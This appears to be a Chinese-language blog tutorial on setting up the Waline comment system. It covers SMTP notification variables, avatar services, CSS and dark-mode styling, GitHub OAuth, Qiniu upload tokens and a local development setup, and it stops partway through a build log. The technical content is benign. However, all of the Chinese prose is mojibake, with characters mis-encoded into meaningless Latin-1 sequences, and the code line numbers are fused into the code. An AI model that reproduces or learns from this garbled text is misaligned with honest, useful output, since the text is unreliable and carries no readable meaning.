SMTP_HOST SMTP æœåŠ¡å™¨åœ°å€ï¼Œä¸€èˆ¬å¯ä»¥åœ¨é‚®ç®±çš„è®¾ç½®ä¸­æ‰¾åˆ°ã€‚ SMTP_PORT SMTP æœåŠ¡å™¨ç«¯å£ï¼Œä¸€èˆ¬å¯ä»¥åœ¨é‚®ç®±çš„è®¾ç½®ä¸­æ‰¾åˆ°ã€‚ SMTP_USER SMTP é‚®ä»¶å‘é€æœåŠ¡çš„ç”¨æˆ·åï¼Œä¸€èˆ¬ä¸ºç™»å½•é‚®ç®±ã€‚ SMTP_PASS SMTP é‚®ä»¶å‘é€æœåŠ¡çš„å¯†ç ï¼Œä¸€èˆ¬ä¸ºé‚®ç®±ç™»å½•å¯†ç ï¼Œéƒ¨åˆ†é‚®ç®± (ä¾‹å¦‚ 163) æ˜¯å•ç‹¬çš„ SMTP å¯†ç ã€‚ SENDER_NAME è‡ªå®šä¹‰å‘é€é‚®ä»¶çš„å‘ä»¶äºº SENDER_EMAIL è‡ªå®šä¹‰å‘é€é‚®ä»¶çš„å‘ä»¶åœ°å€ æç¤ºï¼šå¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æ”¯æŒçš„é‚®ç®±æœåŠ¡å•†ï¼ŒSMTP_SERVICE å’Œ (SMTP_HOSTã€SMTP_PORTï¼‰ä»»é€‰å…¶ä¸€è¿›è¡Œé…ç½®å³å¯ã€‚å¦‚æœåœ¨é‚®ç®±æœåŠ¡å•†åˆ—è¡¨ä¸­æ²¡æœ‰å¯¹åº”çš„ SMTP_SERVICE ï¼Œåˆ™éœ€è¦åŒæ—¶é…ç½® SMTP_HOST å’Œ SMTP_PORTã€‚ å®¢æˆ·ç«¯é…ç½®ç”¨æˆ·å¤´åƒWaline ç›®å‰ä½¿ç”¨ Libravatar æ¥è·å–è¯„è®ºåˆ—è¡¨å¤´åƒã€‚Libravatar æ˜¯è‡ªç”±ã€å¼€æ”¾çš„å¤´åƒæœåŠ¡ï¼Œæ”¯æŒè”é‚¦æ‰˜ç®¡å¹¶ä¸ Gravatar å®Œå…¨å…¼å®¹ã€‚é¦–å…ˆåšä¸»æˆ–è€…ç”¨æˆ·è‡ªè¡Œä½¿ç”¨é‚®ç®±ç™»å½•æˆ–æ³¨å†Œ Libravatarï¼Œç„¶åæ›´æ”¹è‡ªå·±çš„ Libravatar å¤´åƒã€‚å½“åœ¨åšå®¢è¯„è®ºçš„æ—¶å€™ï¼Œç•™ä¸‹åœ¨ Libravatar æ³¨å†Œæ—¶æ‰€ä½¿ç”¨çš„é‚®ç®±å³å¯ï¼Œæˆ–è€…ä½¿ç”¨ Waline å®¢æˆ·ç«¯æä¾›çš„ç™»å½•åŠŸèƒ½ï¼›æœ€å Waline ä¼šè‡ªåŠ¨æ ¹æ®é‚®ç®±åœ°å€å» Libravatar è·å–ç”¨æˆ·çš„å¤´åƒï¼Œå½“æœªèƒ½ä» Libravatar æŸ¥è¯¢åˆ°å¤´åƒæ—¶ï¼Œå°†ä¼šè‡ªåŠ¨è½¬ä¸ºä» Gravatar æŸ¥è¯¢ã€‚ç›®å‰ Waline éè‡ªå®šä¹‰å¤´åƒæœ‰ä»¥ä¸‹ 7 ç§é»˜è®¤å€¼å¯é€‰ï¼š åœ¨ Waline Server ä¸­ï¼Œé€šè¿‡é…ç½®ç¯å¢ƒå˜é‡ GRAVATAR_STR æ¥æŒ‡å®š Libravatar å¤´åƒæœåŠ¡çš„åœ°å€ï¼ˆåŸºäº Nunjucks è¯­æ³•ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥è‡ªå®šä¹‰å®¢æˆ·ç«¯æ‰€ä½¿ç”¨çš„ç”¨æˆ·å¤´åƒç±»å‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1GRAVATAR_STR: \'https://seccdn.libravatar.org/avatar/{{mail|md5}}?d=robohash\' è‹¥ Libravatar æˆ–è€… Gravatar åœ¨å›½å†…è¢«å¢™ï¼Œæ­¤æ—¶è¿˜å¯ä»¥ä½¿ç”¨ Cravatar æ›¿ä»£ã€‚åœ¨ Waline Server ä¸­é…ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼Œå°±å¯ä»¥å¿«é€Ÿåˆ‡æ¢åˆ° Cravatarï¼Œå¹¶è‡ªå®šä¹‰å®¢æˆ·ç«¯æ‰€ä½¿ç”¨çš„ç”¨æˆ·å¤´åƒç±»å‹ï¼š 12AVATAR_PROXY: \'false\'GRAVATAR_STR: \'https://cravatar.cn/avatar/{{mail|md5}}?d=robohash\' ç‰¹åˆ«æ³¨æ„ å°½ç®¡è¯¸å¦‚è°·æ­Œã€QQ ç­‰é‚®ä»¶æä¾›å•†å¯¹ç”µå­é‚®ä»¶ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯ä½ ä»éœ€è¦ä¿è¯ Libravatar æˆ–è€… Gravatar æ³¨å†Œçš„é‚®ç®±å’Œå¡«å…¥çš„é‚®ç®±åœ°å€å¯¹åº”ã€‚è™½ç„¶å…¨çƒå¤§éƒ¨åˆ†å¤§å‹é‚®ä»¶æä¾›å•†å‡ä¸å¯¹ç”µå­é‚®ä»¶ç”¨æˆ·ååŒºåˆ†å¤§å°å†™ï¼Œä½†æ˜¯æ ¹æ® RFC 5231 çš„è§„å®šï¼Œç”µå­é‚®ä»¶æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚è¿™æ„å‘³ç€é‚®ä»¶æä¾›å•†å¯ä»¥å°† abc@xxx.com å’Œ ABC@xxx.com è§†ä¸ºä¸åŒçš„è´¦å·ï¼Œè€Œä¸”ä¹Ÿçš„ç¡®æœ‰é‚®ä»¶æä¾›å•†è¿™æ ·å¤„ç†ã€‚æ‰€ä»¥ä¸ºé˜²æ­¢ä½¿ç”¨æ­¤ç±»é‚®ä»¶æä¾›å•†çš„ç”¨æˆ·æ— æ³•æ”¶åˆ°é‚®ä»¶æˆ–æ˜¾ç¤ºé”™è¯¯çš„å¤´åƒï¼ŒWaline å¹¶ä¸ä¼šå¯¹é‚®ç®±è¿›è¡Œå¤§å°å†™è½¬æ¢ã€‚ æœåŠ¡ç«¯é…ç½®è¯„è®ºé€šçŸ¥å½“åšå®¢æœ‰ç”¨æˆ·å‘å¸ƒè¯„è®ºæˆ–è€…ç”¨æˆ·å›å¤è¯„è®ºæ—¶ï¼ŒWaline æ”¯æŒå¯¹åšä¸»å’Œå›å¤è¯„è®ºä½œè€…è¿›è¡Œé€šçŸ¥ã€‚åšä¸»è¯„è®ºé€šçŸ¥æ”¯æŒé‚®ä»¶ã€å¾®ä¿¡ã€QQ ä¸ Telegramï¼Œå›å¤è¯„è®ºä½œè€…ä»…æ”¯æŒé‚®ä»¶é€šçŸ¥ã€‚ç”±äºç¯‡å¹…æœ‰é™ï¼Œè¿™é‡Œä»…ä»‹ç»é‚®ç®±é€šçŸ¥çš„é…ç½®ï¼Œå…¶ä»–çš„é€šçŸ¥æ–¹å¼å¯å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚é‚®ä»¶é€šçŸ¥éœ€è¦åœ¨ç¯å¢ƒå˜é‡ä¸­é…ç½®ä»¥ä¸‹å±æ€§ï¼š AUTHOR_EMAILï¼šåšä¸»é‚®ç®±ï¼Œç”¨æ¥åŒºåˆ†å‘å¸ƒçš„è¯„è®ºæ˜¯å¦æ˜¯åšä¸»æœ¬èº«å‘å¸ƒçš„ã€‚å¦‚æœæ˜¯åšä¸»å‘å¸ƒçš„åˆ™ä¸è¿›è¡Œæé†’é€šçŸ¥ã€‚ SMTP_SERVICEï¼šSMTP é‚®ä»¶å‘é€æœåŠ¡æä¾›å•†ï¼Œå¯ä»¥åœ¨ è¿™é‡Œ æŸ¥çœ‹æ‰€æœ‰æ”¯æŒçš„è¿è¥å•†ã€‚å¦‚æœæ²¡åœ¨åˆ—è¡¨ä¸­çš„å¯ä»¥è‡ªè¡Œé…ç½® SMTP_HOST å’Œ SMTP_PORTã€‚ SMTP_HOSTï¼šSMTP æœåŠ¡å™¨åœ°å€ï¼Œä¸€èˆ¬å¯ä»¥åœ¨é‚®ç®±çš„è®¾ç½®ä¸­æ‰¾åˆ°ã€‚å¦‚æœæœªé…ç½® SMTP_SERVICE çš„è¯è¯¥é¡¹å¿…å¡«ã€‚ SMTP_PORTï¼šSMTP æœåŠ¡å™¨ç«¯å£ï¼Œä¸€èˆ¬å¯ä»¥åœ¨é‚®ç®±çš„è®¾ç½®ä¸­æ‰¾åˆ°ã€‚å¦‚æœæœªé…ç½® SMTP_SERVICE çš„è¯è¯¥é¡¹å¿…å¡«ã€‚ SMTP_USERï¼šSMTP é‚®ä»¶å‘é€æœåŠ¡çš„ç”¨æˆ·åï¼Œä¸€èˆ¬ä¸ºç™»å½•é‚®ç®±ã€‚ SMTP_PASSï¼šSMTP é‚®ä»¶å‘é€æœåŠ¡çš„å¯†ç ï¼Œä¸€èˆ¬ä¸ºé‚®ç®±ç™»å½•å¯†ç ï¼Œéƒ¨åˆ†é‚®ç®±ï¼ˆä¾‹å¦‚ 163ï¼‰æ˜¯å•ç‹¬çš„ SMTP å¯†ç ã€‚ SMTP_SECUREï¼š SMTP é‚®ä»¶å‘é€åŠ å¯†ï¼Œé»˜è®¤ä¸º trueï¼Œè®¾ç½®ä¸º false åˆ™ä¸ä¼šåŠ å¯†è¯·æ±‚ SITE_NAMEï¼šç½‘ç«™åç§°ï¼Œç”¨äºåœ¨æ¶ˆæ¯ä¸­æ˜¾ç¤ºã€‚ SITE_URLï¼šç½‘ç«™åœ°å€ï¼Œç”¨äºåœ¨æ¶ˆæ¯ä¸­æ˜¾ç¤ºã€‚ SENDER_NAMEï¼šè‡ªå®šä¹‰å‘é€é‚®ä»¶çš„å‘ä»¶äººï¼Œé€‰å¡«ã€‚ SENDER_EMAILï¼šè‡ªå®šä¹‰å‘é€é‚®ä»¶çš„å‘ä»¶åœ°å€ï¼Œé€‰å¡«ã€‚ MAIL_SUBJECTï¼šè¯„è®ºå›å¤é‚®ä»¶æ ‡é¢˜è‡ªå®šä¹‰ MAIL_TEMPLATEï¼šè¯„è®ºå›å¤é‚®ä»¶å†…å®¹è‡ªå®šä¹‰ MAIL_SUBJECT_ADMINï¼šæ–°è¯„è®ºé€šçŸ¥é‚®ä»¶æ ‡é¢˜è‡ªå®šä¹‰ MAIL_TEMPLATE_ADMINï¼šæ–°è¯„è®ºé€šçŸ¥é‚®ä»¶å†…å®¹è‡ªå®šä¹‰ æç¤º ç”¨æˆ·æ³¨å†Œå’Œè¯„è®ºçš„é‚®ä»¶é€šçŸ¥éƒ½ä¼šç”¨åˆ°é‚®ä»¶æœåŠ¡ ç”±äºå›½å†…è…¾è®¯äº‘ã€é˜¿é‡Œäº‘é»˜è®¤ç¦ç”¨äº† 25 ç«¯å£ï¼Œè‹¥ Waline çš„æœåŠ¡ç«¯æ˜¯éƒ¨ç½²åœ¨äº‘æœåŠ¡å™¨ä¸Šï¼Œåˆ™éœ€è¦ä½¿ç”¨ 465 ç«¯å£ï¼Œå¹¶å¯ç”¨ SSL é‚®ä»¶åŠ å¯†ï¼Œæœ€åç³»ç»Ÿé˜²ç«å¢™åˆ«å¿˜äº†å¼€æ”¾ 465 ç«¯å£ Waline Client çš„å…¶ä»–ç‰¹æ€§è‡ªå®šä¹‰æ ·å¼Waline å®¢æˆ·ç«¯é»˜è®¤æä¾›äº†ä¸€äº› CSS å˜é‡ï¼Œå¯ä»¥å¾ˆè½»æ¾çš„é€šè¿‡è¿™äº›å˜é‡è‡ªå®šä¹‰ Waline å®¢æˆ·ç«¯çš„ CSS æ ·å¼ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344:root { /* å­—ä½“å¤§å° */ --waline-font-size: 16px; /* å¸¸è§„é¢œè‰² */ --waline-white: #fff; --waline-light-grey: #999; --waline-dark-grey: #666; /* ä¸»é¢˜è‰² */ --waline-theme-color: #27ae60; --waline-active-color: #2ecc71; /* å¸ƒå±€é¢œè‰² */ --waline-color: #444; --waline-bgcolor: #fff; --waline-bgcolor-light: #f8f8f8; --waline-bgcolor-hover: #f0f0f0; --waline-border-color: #ddd; --waline-disable-bgcolor: #f8f8f8; --waline-disable-color: #bbb; --waline-code-bgcolor: #282c34; /* ç‰¹æ®Šé¢œè‰² */ --waline-bq-color: #f0f0f0; /* å¤´åƒ */ --waline-avatar-size: 3.25rem; --waline-m-avatar-size: calc(var(--waline-avatar-size) * 9 / 13); /* å¾½ç«  */ --waline-badge-color: #3498db; --waline-badge-font-size: 0.775em; /* ä¿¡æ¯ */ --waline-info-bgcolor: #f8f8f8; --waline-info-color: #999; --waline-info-font-size: 0.625em; /* æ¸²æŸ“é€‰æ‹© */ --waline-border: 1px solid var(--waline-border-color); --waline-avatar-radius: 50%; --waline-box-shadow: none;} å¦‚æœä½¿ç”¨äº†ä¸€ä¸ªå¤§é‡è¿ç”¨é˜´å½± (box-shadow) çš„ä¸»é¢˜ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ --waline-border å’Œ --waline-box-shadow æ¥æ›´æ”¹ Waline å®¢æˆ·ç«¯çš„é˜´å½±æ ·å¼ï¼Œå¦‚: 12345678910:root { --waline-border: none; --waline-box-shadow: 0 12px 40px rgb(134 151 168 / 25%);}@media (prefers-color-scheme: dark) { body { --waline-box-shadow: 0 12px 40px #0f0e0d; }} å¦‚æœä¸Šé¢çš„ CSS å˜é‡æ— æ³•æ»¡è¶³ä½ å¯¹ Waline æ ·å¼çš„å®šåˆ¶è¦æ±‚ï¼Œä½ å¯ä»¥åœæ­¢å¯¼å…¥ Waline å®˜æ–¹æä¾›çš„æ ·å¼ï¼Œå¹¶è‡ªå·±åˆ¶ä½œ CSSã€‚ è‡ªå®šä¹‰è¡¨æƒ…åŒ… Waline å®¢æˆ·ç«¯è‡ªå®šä¹‰è¡¨æƒ…åŒ… å¯ç”¨æš—é»‘æ¨¡å¼Waline å®¢æˆ·ç«¯é»˜è®¤æ”¯æŒæš—é»‘æ¨¡å¼ï¼Œåªéœ€åœ¨ Waline å®¢æˆ·ç«¯åˆå§‹åŒ–çš„æ—¶å€™ï¼ŒæŒ‡å®š dark å‚æ•°å³å¯ è®¾ç½® dark: auto ä¼šæ ¹æ®è®¾å¤‡é¢œè‰²æ¨¡å¼è‡ªåŠ¨åˆ‡æ¢ å¡«å…¥ CSS é€‰æ‹©å™¨ï¼Œåˆ™ä¼šåœ¨å¯¹åº”é€‰æ‹©å™¨ç”Ÿæ•ˆæ—¶å¯ç”¨æš—é»‘æ¨¡å¼ é’ˆå¯¹ä¸åŒçš„ Hexo ä¸»é¢˜ï¼ŒWaline å®¢æˆ·ç«¯çš„é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š vuepress-theme-hopeï¼šå®ƒä¼šåœ¨ &lt;body&gt; ä¸Šæ·»åŠ  theme-dark class æ¥å¼€å¯æš—é»‘æ¨¡å¼ï¼Œé‚£ä¹ˆéœ€è¦å°† dark é€‰é¡¹è®¾ç½®ä¸º body.theme-dark Docusaurusï¼šå®ƒä¼šåœ¨ &lt;html&gt; ä¸Šé€šè¿‡è®¾ç½® data-theme="dark" å¼€å¯æš—é»‘æ¨¡å¼ï¼Œé‚£ä¹ˆéœ€è¦å°† dark é€‰é¡¹è®¾ç½®ä¸º \'html[data-theme="dark"]\' hexo-theme-fluidï¼šå®ƒä¼šåœ¨ &lt;html&gt; ä¸Šé€šè¿‡è®¾ç½® data-user-color-scheme="dark" å¼€å¯æš—é»‘æ¨¡å¼ï¼Œé‚£ä¹ˆéœ€è¦å°† dark é€‰é¡¹è®¾ç½®ä¸º \'html[data-user-color-scheme="dark"]\' è‹¥ Hexo ä½¿ç”¨çš„æ˜¯ Next ä¸»é¢˜ï¼Œä¸”æ˜¯é€šè¿‡æ’ä»¶ hexo-next-darkmode æ¥è‡ªåŠ¨æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ Next ä¸»é¢˜çš„ _config.yml é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä»¥ä¸‹å†…å®¹æ¥å¯ç”¨ Waline å®¢æˆ·ç«¯çš„æš—é»‘æ¨¡å¼ 1234waline: enable: true dark: \'body.darkmode--activated\' ... åœ¨æš—é»‘æ¨¡å¼ä¸‹ï¼ŒWaline å®¢æˆ·ç«¯é»˜è®¤ä¼šä½¿ç”¨ä»¥ä¸‹æ ·å¼ï¼Œè‹¥å¸Œæœ›è‡ªå®šä¹‰æš—é»‘æ¨¡å¼çš„ CSS æ ·å¼ï¼Œç›´æ¥è¦†ç›–ä»¥ä¸‹ CSS æ ·å¼å³å¯ã€‚ 12345678910111213141516171819202122/* æ ¹æ®ç”¨æˆ·è®¾ç½® â†“ */darkmode-selector { /* å¸¸è§„é¢œè‰² */ --waline-white: #000; --waline-light-grey: #666; --waline-dark-grey: #999; /* å¸ƒå±€é¢œè‰² */ --waline-color: #888; --waline-bgcolor: #1e1e1e; --waline-bgcolor-light: #272727; --waline-border-color: #333; --waline-disable-bgcolor: #444; --waline-disable-color: #272727; /* ç‰¹æ®Šé¢œè‰² */ --waline-bq-color: #272727; /* å…¶ä»–é¢œè‰² */ --waline-info-bgcolor: #272727; --waline-info-color: #666;} æç¤º Next ä¸»é¢˜ä½¿ç”¨æ’ä»¶ hexo-next-darkmode æ¥è‡ªåŠ¨æ·»åŠ å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼ï¼Œè¯¦ç»†çš„æ­¥éª¤å¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ã€‚ Github ç¤¾äº¤ç™»å½•æœ€æ–°ç‰ˆ Waline å¢åŠ äº†ç™»å½•è¯„è®ºåŠŸèƒ½ï¼Œé™¤äº†æ™®é€šçš„è´¦å·ç™»å½•ä¹‹å¤–ï¼Œè¿˜æ”¯æŒä½¿ç”¨ç¬¬ä¸‰æ–¹ç¤¾äº¤è´¦å·è¿›è¡Œç›´æ¥ç™»å½•ã€‚ç›®å‰å®˜æ–¹æ”¯æŒ Github ç¤¾äº¤è´¦å·ç™»å½•ï¼Œå½“ç„¶é»˜è®¤æ²¡æœ‰å¼€å¯ Github ç¤¾äº¤è´¦å·ç™»å½•åŠŸèƒ½ï¼Œéœ€è¦åšä¸€äº›é…ç½®æ‰èƒ½æ”¯æŒã€‚è‹¥è¦å¢åŠ  Github è´¦å·ç™»å½•åŠŸèƒ½ï¼Œéœ€è¦é…ç½® Github OAuth å¯†é’¥ã€‚ç‚¹å‡» ã€ŠRegister a new OAuth applicationã€‹ è¿›å…¥ Github OAuth åº”ç”¨ç”³è¯·é¡µé¢ï¼Œè¿™é‡Œéœ€è¦å¡«å…¥ä»¥ä¸‹å‡ ä¸ªé…ç½®ï¼š Application nameï¼šåº”ç”¨åç§°ï¼Œå¯ä»¥éšæ„ï¼Œä¼šåœ¨ç”¨æˆ·æˆæƒæ—¶æ˜¾ç¤ºï¼Œæ¨èä½¿ç”¨åšå®¢åç§°ã€‚ Homepage URLï¼šåº”ç”¨ä¸»é¡µåœ°å€ï¼Œå¯ä»¥éšæ„ï¼Œä¼šåœ¨ç”¨æˆ·æˆæƒæ—¶æ˜¾ç¤ºï¼Œæ¨èä½¿ç”¨åšå®¢åœ°å€ã€‚ Appcation descriptionï¼šåº”ç”¨æè¿°ï¼Œå¯ä»¥éšæ„ï¼Œä¼šåœ¨ç”¨æˆ·æˆæƒæ—¶æ˜¾ç¤ºï¼Œéå¿…å¡«é¡¹ã€‚ Authorization callback URLï¼šåº”ç”¨çš„å›è°ƒåœ°å€ï¼Œç™»å½•æ—¶éœ€è¦ä½¿ç”¨ã€‚å¡«å…¥ &lt;serverURL&gt;/oauth/github å…¶ä¸­ &lt;serverURL&gt; æ˜¯ä½ çš„ Waline æœåŠ¡ç«¯åœ°å€ã€‚ å¡«å®Œåç‚¹å‡» Register application æŒ‰é’®å°±æˆåŠŸåˆ›å»ºåº”ç”¨äº†ï¼Œå¯ä»¥åœ¨é¡µé¢ä¸­çœ‹åˆ° Client IDã€‚ç‚¹å‡» Client secrets æ å³è¾¹çš„ Generate a new client secret æŒ‰é’®ï¼Œå¯ä»¥è·å–åˆ°è¯¥åº”ç”¨çš„ Client secretsã€‚ æœ€åæŒ‰ç…§å¦‚ä¸‹ç¯å¢ƒå˜é‡é…ç½®ï¼Œå°†ä¸Šé¢è·å–åˆ°çš„å¯†é’¥ï¼ˆClient secretsï¼‰é…ç½®è¿› Waline æœåŠ¡ç«¯çš„ç¯å¢ƒå˜é‡ä¸­ï¼Œç„¶åé‡æ–°éƒ¨ç½² Waline æœåŠ¡ç«¯åå³å¯ä½¿ç”¨ Github ç™»å½•ã€‚ ç¯å¢ƒå˜é‡åç§° å¤‡æ³¨ GITHUB_ID å¯¹åº” Github OAuth Application ä¸­çš„ Client ID GITHUB_SECRET å¯¹åº” Github OAuth Application ä¸­çš„ Client secrets ç”±äº Github çš„ API è°ƒç”¨åœ¨å›½å†…ä¸å¤ªç¨³å®šï¼Œå»ºè®®ç›´æ¥ä½¿ç”¨æ™®é€šçš„è´¦å·ç™»å½• ä¸Šä¼ å›¾ç‰‡è‡³ä¸ƒç‰›å›¾åºŠWaline å®¢æˆ·ç«¯å†…ç½®äº†å›¾åƒä¸Šä¼ çš„æ”¯æŒï¼Œé»˜è®¤ä¼šå°†å›¾ç‰‡è½¬æ¢ä¸º Base64 å­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡ Waline Server è¿›è¡Œå­˜å‚¨ï¼Œä¾‹å¦‚å°†å›¾ç‰‡å­˜å‚¨åˆ° MySQLã€‚åœ¨ Hexo çš„ Next ä¸»é¢˜ä¸‹ï¼Œè‹¥å¸Œæœ›ä½¿ç”¨ä¸ƒç‰›å›¾åºŠï¼Œåˆ™å¯ä»¥å®‰è£… Waline çš„ç¬¬ä¸‰æ–¹æ’ä»¶ hexo-waline-next æ¥å®ç°ã€‚ 12345# å¸è½½Walineå®˜æ–¹æ’ä»¶$ npm uninstall @waline/hexo-next --save# å®‰è£…Walineç¬¬ä¸‰æ–¹æ’ä»¶ï¼ˆé»˜è®¤æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼‰$ npm install hexo-waline-next --save ç¬¬ä¸‰æ–¹æ’ä»¶ hexo-waline-next ä½¿ç”¨äº†ä¸ƒç‰›å®˜æ–¹çš„ Qiniu-JavaScript-SDK ï¼Œä¸ºäº†å®‰å…¨è€ƒè™‘ï¼Œé»˜è®¤æ²¡æœ‰åŒ…å« Upload Token çš„ç”Ÿæˆå®ç°ï¼Œå› æ­¤ Upload Token éœ€è¦é€šè¿‡ç½‘ç»œä»æœåŠ¡ç«¯ï¼ˆè‡ªå»ºï¼‰è·å–ï¼ŒæœåŠ¡ç«¯ä»£ç å¯ä»¥å‚è€ƒä¸ƒç‰›æœåŠ¡ç«¯ SDK çš„æ–‡æ¡£ï¼Œæ’ä»¶çš„é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456waline: enable: true qiniuDebug: false # print the error message of the picture uploaded by qiniu qiniuDomain: https://qiniu.example.cn # The custom domain for qiniu, e.g https://qiniu.example.cn qiniuTokenUrl: https://api.example.cn/qiniu/sdk/token/upload # The api to get qiniu token, e.g https://api.example.cn/qiniu/sdk/token/upload ... qiniuDomainï¼šä¸ƒç‰›çš„å¤–é“¾åŸŸå qiniuDebugï¼šå‰ç«¯æ˜¯å¦è¾“å‡ºä¸ƒç‰›ä¸Šä¼ å›¾ç‰‡çš„é”™è¯¯ä¿¡æ¯ qiniuTokenUrlï¼šè·å–ä¸ƒç‰› Upload Token çš„æ¥å£åœ°å€ è‹¥å¸Œæœ›ç¦ç”¨å›¾ç‰‡ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹é…ç½®å†…å®¹ï¼Œé€‚ç”¨äº Waline å®¢æˆ·ç«¯é»˜è®¤çš„å›¾ç‰‡ä¸Šä¼ å’Œä¸ƒç‰›å›¾åºŠä¸Šä¼ ï¼š 1234waline: enable: true allowUploadImage: false # Allow upload picture ... allowUploadImageï¼šæ˜¯å¦å…è®¸ä¸Šä¼ å›¾ç‰‡ï¼Œé»˜è®¤å€¼ä¸ºï¼štrue ç¬¬ä¸‰æ–¹æ’ä»¶ hexo-waline-next å¯¹ä¸ƒç‰› Upload Token æ¥å£è¿”å›æ•°æ®ï¼ˆJSONï¼‰çš„å®šä¹‰å¦‚ä¸‹ï¼š 1234{ "data": "tdvdhnpSs2JFt8U9-c9hL74ddWtEj", "msg": "success"} å‚æ•°åç§° ç±»å‹ å®ä¾‹å€¼ è¯´æ˜ status code Number 200 HTTP å“åº”çŠ¶æ€ç ï¼ŒæˆåŠŸè¿”å› 200ï¼Œéæ³•è¯·æ±‚æ¥æºè¿”å› 403ï¼Œæ¥å£è°ƒç”¨å¤ªé¢‘ç¹è¿”å› 429ï¼Œç³»ç»Ÿå†…éƒ¨å‡ºé”™è¿”å› 500 data String tdvdhnpSs2JFt8U9-c9hL74ddWtEj Upload Token çš„å€¼ msg String success æ¶ˆæ¯æç¤ºå†…å®¹ æé«˜ä¸ƒç‰› Upload Token æ¥å£çš„å®‰å…¨æ€§ï¼š å…¨ç«™å¯ç”¨ HTTPS åè®® é€šè¿‡ HTTP Header çš„ referer ã€ X-Real-IP ã€X-Forwarded-For ç­‰æ¥é™åˆ¶è¯·æ±‚æ¥æºçš„åŸŸåã€IP è·å– Upload Token çš„æ¥å£åº”è¯¥å†…ç½®é™æµåŠŸèƒ½ï¼Œé¿å…å¤–éƒ¨æ¶æ„é¢‘ç¹è°ƒç”¨æ¥å£ï¼Œä¾‹å¦‚é™åˆ¶æ¯åˆ†é’Ÿåªèƒ½è°ƒç”¨ä¸¤æ¬¡æ¥å£ æœåŠ¡ç«¯ç”Ÿæˆ Upload Token æ—¶ï¼Œåº”è¯¥æŒ‡å®šä¸Šä¼ ç­–ç•¥ï¼Œä¾‹å¦‚è®¾ç½® Token çš„æœ‰æ•ˆæ—¶é—´ï¼ˆexpiresã€deadlineï¼‰ï¼Œå…·ä½“å¯å‚è€ƒä¸ƒç‰›å®˜æ–¹æ–‡æ¡£ä¸€ã€ä¸ƒç‰›å®˜æ–¹æ–‡æ¡£äºŒï¼ŒJava ç‰ˆæœåŠ¡ç«¯çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011String bucket = "bucket name";String accessKey = "access key";String secretKey = "secret key";//æŒ‡å®šUploadTokençš„æœ‰æ•ˆæ—¶é—´ä¸º10ç§’long expireSeconds = 10;StringMap putPolicy = new StringMap();Auth auth = Auth.create(accessKey, secretKey);String upToken = auth.uploadToken(bucket, null, expireSeconds, putPolicy);System.out.println(upToken); Waline å¼€å‘æŒ‡å—å‡†å¤‡å·¥ä½œ ä½¿ç”¨ Git å…‹éš†é¡¹ç›® 1$ git clone https://github.com/lizheming/waline.git ä¿è¯ NPM çš„ç‰ˆæœ¬æ˜¯ 7 Node 14 åŠä»¥ä¸‹é»˜è®¤ä½¿ç”¨ npm@v6ï¼Œä½ éœ€è¦ç¡®ä¿è‡ªå·±ä½¿ç”¨ npm@v7 ç‰ˆæœ¬ï¼Œå¦åˆ™è¿è¡Œæˆ–è€…ç¼–è¯‘æ„å»º Waline ç»„ä»¶æ—¶ä¼šå‡ºé”™ 12345# å®‰è£…æœ€æ–°ç‰ˆçš„NPM$ npm i -g npm@latest# æŸ¥çœ‹NPMçš„ç‰ˆæœ¬$ npm -v å®‰è£…ä¾èµ– 123$ cd waline$ npm i æœ¬åœ°å¼€å‘æœ¬åœ°ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ @waline/clientï¼Œç”±äº Waline é‡‡ç”¨ Client/Server æ¶æ„ï¼Œåœ¨è°ƒè¯• client æ—¶ï¼Œå¿…é¡»é…ç½®æœ¬åœ°ç¯å¢ƒå˜é‡ SERVERURL è‡³ waline/packages/client/.envï¼Œå…¶ä¸­åœ¨ waline/packages/client/.env.example æ–‡ä»¶é‡Œæœ‰å¯å‚è€ƒçš„é…ç½®ç¤ºä¾‹ã€‚ 1$ npm run client:dev @waline/client æ­£å¸¸å¯åŠ¨æ—¶ï¼Œè¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼Œæ­¤æ—¶æµè§ˆå™¨ç›´æ¥è®¿é—® http://127.0.0.1:9000 å°±å¯ä»¥å¼€å§‹æµ‹è¯•æœ¬åœ°çš„ @waline/client 123456789101112131415161718192021222324252627&gt; client:dev&gt; npm run dev --workspace=@waline/client&gt; @waline/client@1.3.3 dev&gt; webpack serve --mode=development --config ./build/webpack.config.js&lt;i&gt; [webpack-dev-server] Project is running at:&lt;i&gt; [webpack-dev-server] Loopback: http://127.0.0.1:9000&lt;i&gt; [webpack-dev-server] On Your Network (IPv4): http://192.168.1.128:9000/&lt;i&gt; [webpack-dev-server] Content not from webpack is served from \'/usr/local/waline/packages/client/public\' directoryasset Waline.min.js 1010 KiB [emitted] (name: main) 1 related assetasset index.html 967 bytes [emitted]runtime modules 27.1 KiB 13 modulescacheable modules 832 KiB modules by path ./src/ 95.3 KiB 48 modules modules by path ../../node_modules/ 737 KiB modules by path ../../node_modules/webpack-dev-server/client/ 48.9 KiB 12 modules modules by path ../../node_modules/style-loader/dist/runtime/*.js 5.02 KiB 6 modules modules by path ../../node_modules/webpack/hot/*.js 4.3 KiB 4 modules modules by path ../../node_modules/html-entities/lib/*.js 81.3 KiB 4 modules modules by path ../../node_modules/@vue/ 437 KiB 4 modules modules by path ../../node_modules/url/ 37.4 KiB 3 modules modules by path ../../node_modules/querystring/*.js 4.51 